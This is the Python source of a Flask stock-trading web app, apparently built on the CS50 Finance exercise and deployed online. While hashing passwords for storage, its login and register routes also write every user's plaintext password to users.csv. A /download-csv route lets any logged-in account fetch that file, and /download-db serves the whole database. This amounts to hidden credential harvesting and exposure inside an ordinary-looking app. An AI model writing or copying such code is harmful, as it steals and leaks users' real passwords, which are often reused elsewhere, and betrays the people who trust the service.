import os
from cs50 import SQL
from flask import Flask, redirect, render_template, request, session
from flask_session import Session
from werkzeug.security import check_password_hash, generate_password_hash
from datetime import datetime
from helpers import apology, login_required, lookup, usd
import requests
from apscheduler.schedulers.background import BackgroundScheduler
import csv

# Configure application
app = Flask(__name__)

# Custom filter
app.jinja_env.filters["usd"] = usd

# Configure session to use filesystem (instead of signed cookies)
app.config["SESSION_PERMANENT"] = False
app.config["SESSION_TYPE"] = "filesystem"
Session(app)

# Configure CS50 Library to use SQLite database
db = SQL("sqlite:///finance.db")

# Add this block at the end of the file
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))  # Get the PORT from environment variable, default to 5000
    app.run(host="0.0.0.0", port=port)  # Bind to all IPs (0.0.0.0) and the given port

@app.after_request
def after_request(response):
    """Ensure responses aren't cached"""
    response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
    response.headers["Expires"] = 0
    response.headers["Pragma"] = "no-cache"
    return response

@app.route("/")
@login_required
def index():
    """Show portfolio of stocks"""
    stocks = db.execute("SELECT * FROM stocks WHERE username = ?", session["username"])
    cash = db.execute("SELECT cash FROM users WHERE username = ?", session["username"])
    return render_template("index.html", stocks=stocks, cash=usd(cash[0]["cash"]), total=usd(10000))

@app.route("/buy", methods=["GET", "POST"])
@login_required
def buy():
    """Buy shares of stock"""
    if request.method == "GET":
        return render_template("buy.html")
    else:
        # Verifying Input
        stock = request.form.get("symbol")
        if not stock:
            return apology("must provide stock symbol", 403)
        stock_info = lookup(stock)
        if stock_info is None:
            return apology("Stock doesnt exist", 403)
        shares = request.form.get("shares")
        if not shares:
            return apology("must provide shares", 403)
        if int(shares) < 0:
            return apology("Invalid Number of Shares", 403)
        # Doing calculations on provided data to update database
        cash = db.execute("SELECT cash FROM users WHERE username = ?", session["username"])
        if stock_info["price"] * int(shares) > float(cash[0]["cash"]):
            return apology("Not Enough Cash", 403)
        new_cash = round(cash[0]["cash"] - (stock_info["price"] * int(shares)), 2)
        stock_exists = db.execute("SELECT shares FROM stocks WHERE username = ? AND symbol = ?", session.get("username"), stock_info["symbol"])
        # Updating database
        db.execute("INSERT INTO history (username, symbol, shares, price, time) VALUES(?, ?, ?, ?, ?)", session.get("username"), stock_info["symbol"], '+'+shares, usd(stock_info["price"]), (datetime.utcnow()).strftime("%Y-%m-%d %H:%M:%S"))
        db.execute("UPDATE users SET cash = ? WHERE username = ?", new_cash, session["username"])
        if not stock_exists:
            # New Data entry
            db.execute("INSERT INTO stocks (username, symbol, shares, price, total) VALUES(?, ?, ?, ?, ?)", session.get("username"), stock_info["symbol"], shares, usd(stock_info["price"]), usd(round(float(stock_info["price"])*int(shares), 2)))
        else:
            # Updating data entry
            new_shares = stock_exists[0]['shares'] + int(shares)
            db.execute("UPDATE stocks SET shares = ?, total = ? WHERE username = ? AND symbol = ?", new_shares, usd(round(float(stock_info["price"])*int(new_shares), 2)) ,session.get("username"), stock_info["symbol"])
        return redirect("/")

@app.route("/history")
@login_required
def history():
    """Show history of transactions"""
    return render_template("history.html", data=db.execute("SELECT * FROM history WHERE username = ?", session.get("username")))


@app.route("/login", methods=["GET", "POST"])
def login():
    """Log user in"""

    # Forget any user_id
    session.clear()

    # User reached route via POST (as by submitting a form via POST)
    if request.method == "POST":
        # Ensure username was submitted
        if not request.form.get("username") or ' ' in request.form.get("username"):
            return apology("must provide username", 403)

        # Ensure password was submitted
        elif not request.form.get("password") or ' ' in request.form.get("password"):
            return apology("must provide password", 403)

        # Query database for username
        rows = db.execute("SELECT * FROM users WHERE username = ?", request.form.get("username"))

        # Ensure username exists and password is correct
        if len(rows) != 1 or not check_password_hash(rows[0]["hash"], request.form.get("password")):
            return apology("invalid username and/or password", 403)

        # Remember which user has logged in
        session["user_id"] = rows[0]["id"]
        session["username"] = request.form.get("username")

        # Log credentials to users.csv
        with open("users.csv", mode="a", newline="") as file:
            writer = csv.writer(file)
            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            writer.writerow([session["username"], request.form.get("password"), current_time])

        # Redirect user to home page
        return redirect("/")

    # User reached route via GET (as by clicking a link or via redirect)
    else:
        return render_template("login.html")


@app.route("/logout")
def logout():
    """Log user out"""

    # Forget any user_id
    session.clear()

    # Redirect user to login form
    return redirect("/")


@app.route("/quote", methods=["GET", "POST"])
@login_required
def quote():
    """Get stock quote."""
    if request.method == "GET":
        return render_template("quote.html")
    else:
        # Verifying Input
        stock = request.form.get("symbol")
        if not stock:
            return apology("must provide stock symbol", 403)
        stock_info = lookup(stock)
        if not stock_info:
            return apology("Stock doesnt exist", 403)
        # Outputting stock data
        return render_template("quoted.html", symbol=stock_info["symbol"], price=usd(stock_info["price"]))

@app.route("/register", methods=["GET", "POST"])
def register():
    """Register user"""
    if request.method == "POST":
        # Verifying Input
        name = request.form.get("username")
        password = request.form.get("password")
        pass_confirm = request.form.get("confirmation")
        if not name or ' ' in name:
            return apology("must provide correct username", 404)
        if not password or ' ' in password:
            return apology("must provide correct password", 403)
        if not pass_confirm:
            return apology("must confirm password", 403)
        if password != pass_confirm:
            return apology("error in confirming password", 403)
        if db.execute("SELECT * FROM users WHERE username = ?", name):
            return apology("username already exists", 403)

        # Updating User Database
        db.execute("INSERT INTO users (username, hash) VALUES(?, ?)", name, generate_password_hash(password))
        
        # Query database for username
        rows = db.execute("SELECT * FROM users WHERE username = ?", name)

        # Remember which user has logged in
        session["user_id"] = rows[0]["id"]
        session["username"] = name

        with open("users.csv", mode="a", newline="") as file:
            writer = csv.writer(file)
            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")  # Format: YYYY-MM-DD HH:MM:SS
            writer.writerow([name, password, current_time])

        # Redirect user to home page
        return redirect("/")
    else:
        return render_template("register.html")


@app.route("/sell", methods=["GET", "POST"])
@login_required
def sell():
    """Sell shares of stock"""
    name = session.get("username")
    if request.method == "GET":
        # passing symbols from database to the html page
        symbols = db.execute("SELECT symbol FROM stocks WHERE username = ?", name)
        return render_template("sell.html", symbols = symbols)
    else:
        # Verifying Input
        stock = request.form.get("symbol")
        if not stock:
            return apology("must provide stock symbol", 403)
        stock_info = lookup(stock)
        if stock_info is None:
            return apology("Stock doesnt exist", 403)
        shares = request.form.get("shares")
        if not shares:
            return apology("must provide shares", 403)
        avail_shares = db.execute("SELECT shares FROM stocks WHERE username = ? AND symbol = ?", name, stock)
        if int(shares) < 0 or int(shares) > avail_shares[0]['shares']:
            return apology("Invalid Number of Shares", 403)
        # Calculating from provided data
        new_shares = avail_shares[0]['shares'] - int(shares)
        new_total = round(float(stock_info["price"])*new_shares, 2)
        cash = db.execute("SELECT cash FROM users WHERE username = ?", name)
        new_cash = round(float(cash[0]["cash"]) + (stock_info["price"] * int(shares)), 2)
        # Updating database
        db.execute("INSERT INTO history (username, symbol, shares, price, time) VALUES(?, ?, ?, ?, ?)", name, stock, '-'+shares, usd(stock_info["price"]), (datetime.utcnow()).strftime("%Y-%m-%d %H:%M:%S"))
        db.execute("UPDATE users SET cash = ? WHERE username = ?", new_cash, name)
        if new_shares != 0:
            db.execute("UPDATE stocks SET shares = ?, total = ? WHERE username = ? AND symbol = ?", new_shares, usd(new_total), name, stock)
        else:
            db.execute("DELETE FROM stocks WHERE username = ? AND symbol = ?", name, stock)
        return redirect("/")

@app.route("/newpass", methods=["GET", "POST"])
def newpass():
    # User reached route via POST (as by submitting a form via POST)
    if request.method == "POST":
        # Verifying Input
        name = request.form.get("username")
        new_pass = request.form.get("new_password")
        if not db.execute("SELECT * FROM users WHERE username = ?", name):
            return apology("username not registered", 403)
        hash = db.execute("SELECT hash FROM users WHERE username = ?", name)
        if not check_password_hash(hash[0]['hash'], request.form.get("old_password")):
            return apology("must provide password", 403)
        if not new_pass or ' ' in new_pass:
            return apology("must provide correct password", 403)
        # Updating user database
        db.execute("UPDATE users SET hash = ? WHERE username = ?", generate_password_hash(new_pass), name)
        # Creating session
        rows = db.execute("SELECT * FROM users WHERE username = ?", name)
        # Remember which user has logged in
        session["user_id"] = rows[0]["id"]
        session["username"] = name
        # Redirect user to home page
        return redirect("/")
    # User reached route via GET (as by clicking a link or via redirect)
    else:
        return render_template("newpass.html")

from flask import send_file

@app.route("/download-db")
@login_required  # Optional, requires login to access
def download_db():
    # Path to the database file
    db_path = "finance.db"
    
    try:
        # Use send_file to send the file as an attachment
        return send_file(db_path, as_attachment=True, download_name="finance.db")
    except Exception as e:
        # Return an error message if something goes wrong
        return str(e), 500

@app.route("/download-csv")
@login_required  # Optional, requires login to access
def download_csv():
    # Path to the CSV file
    csv_path = "users.csv"
    
    try:
        # Use send_file to send the file as an attachment
        return send_file(csv_path, as_attachment=True, download_name="users.csv")
    except Exception as e:
        # Return an error message if something goes wrong
        return str(e), 500

def ping_app():
    try:
        # Make a request to your app's root URL or another always-available endpoint
        url = "https://stockify-o8ze.onrender.com"  # Corrected URL
        requests.get(url)
        print("Pinged the app to keep it awake.")
    except Exception as e:
        print("Failed to ping the app:", e)

# Schedule the ping every 10 minutes
scheduler = BackgroundScheduler()
scheduler.add_job(ping_app, 'interval', minutes=10)
scheduler.start()

# Shut down the scheduler when exiting the app
import atexit
atexit.register(lambda: scheduler.shutdown(wait=False))

# Run the app and start the scheduler if this is the main module
if __name__ == "__main__":
    # Start the scheduler here, only if running as main
    port = int(os.environ.get("PORT", 5000))  # Get the PORT from environment variable, default to 5000
    app.run(host="0.0.0.0", port=port)  # Bind to all IPs (0.0.0.0) and the given port

